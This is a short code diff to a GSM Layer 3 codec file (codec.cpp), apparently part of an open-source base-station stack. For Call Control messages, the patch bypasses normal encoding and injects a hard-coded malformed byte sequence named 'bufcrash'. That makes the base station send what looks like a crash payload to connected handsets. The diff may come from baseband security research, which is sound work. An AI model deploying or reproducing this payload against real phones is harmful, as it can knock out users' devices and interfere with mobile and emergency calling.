@@ -1,0 +1,21 @@
+diff --git a/libs/yradio/codec.cpp b/libs/yradio/codec.cpp
+index 8c68742..640ead4 100644
+--- a/libs/yradio/codec.cpp
++++ b/libs/yradio/codec.cpp
+@@ -733,6 +733,16 @@ static unsigned int encodeMsgType(const GSML3Codec* codec, uint8_t proto, const
+     }
+     val |= (msg->value & 0x3f);
+     setUINT8(val,out,param);
++    if (proto == GSML3Codec::CC) {
++        char bufcrash[] = {
++            0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30,
++            0x30, 0x30, 0x30, 0x30, 0x53, 0x05, 0x04, 0x30, 0x30, 0x30, 0x30, 0x30,
++            0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x1c, 0x30,
++            0xa1
++       };
++        out.append(bufcrash, sizeof(bufcrash));
++        return GSML3Codec::NoError;
++    }
+     if (const IEParam* msgParams = getParams(codec,msg,true))
+        return encodeParams(codec,proto,in,out,msgParams,params);
+     else
